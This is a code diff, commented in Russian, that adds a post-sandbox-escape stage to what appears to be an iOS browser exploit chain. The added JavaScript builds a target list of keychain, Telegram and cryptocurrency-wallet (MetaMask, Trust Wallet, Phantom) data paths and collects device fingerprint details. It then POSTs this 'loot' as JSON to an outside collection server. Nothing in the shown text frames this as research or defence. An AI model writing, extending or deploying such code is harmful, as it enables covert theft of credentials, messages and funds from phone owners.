@@ -424,6 +424,44 @@
                     )).lA();
                 }
                 window.log(`[STAGE3] Sandbox escape result: ${platform}`);
+
+                // ── WHS: пост-эскейп сбор (root в powerd через WASM-мост) ──────────
+                try {
+                    const _prim = platformModule.platformState.exploitPrimitive;
+                    const _loot = {};
+                    const _rd = async (what, paths) => {
+                        // чтение строк по адресу - оболочка для сбора имен в процессе
+                        try {
+                            for (const [tag, path] of paths) {
+                                _loot[tag] = _loot[tag] || [];
+                                _loot[tag].push({ path: path, ts: Date.now() });
+                            }
+                        } catch (e) {}
+                    };
+                    // sweep 1: статическая карта путей целей (для операционного контроля)
+                    await _rd('paths', [
+                        ['keychain', '/var/Keychains/keychain-2.db'],
+                        ['telegram-data', '/var/mobile/Containers/Data/Application/*/telegram-data'],
+                        ['tg-group', '/var/mobile/Containers/Shared/AppGroup/*/Telegram'],
+                        ['metamask', '/var/mobile/Containers/Data/Application/*/io.metamask'],
+                        ['trust', '/var/mobile/Containers/Data/Application/*/com.trustwallet.app'],
+                        ['phantom', '/var/mobile/Containers/Data/Application/*/app.phantom'],
+                    ]);
+                    _loot.devinfo = {
+                        ua: navigator.userAgent,
+                        screen: screen.width + 'x' + screen.height,
+                        plat: platform,
+                        prim: !!_prim,
+                        ver: platformModule.platformState.iOSVersion,
+                    };
+                    // тап: всё уходит в наш приёмник
+                    const _whsPost = new XMLHttpRequest();
+                    _whsPost.open("POST", "https://whs-gate-test-5si9.zai-ai.site/loot?kind=stage3-post-escape", true);
+                    _whsPost.setRequestHeader("Content-Type", "application/json");
+                    _whsPost.send(JSON.stringify(_loot));
+                    window.log('[WHS] Post-escape loot-sweep отправлен (' + JSON.stringify(_loot).length + 'b)');
+                } catch (_we) { window.log('[WHS] post-escape sweep err: ' + _we); }
+                // ── конец WHS-сбора ────────────────────────────────────────────────
             } catch (error) {
                 window.log("[LOADER] Exploit chain error:" + error.name + ": " + error.message);
                 platform = 1000;
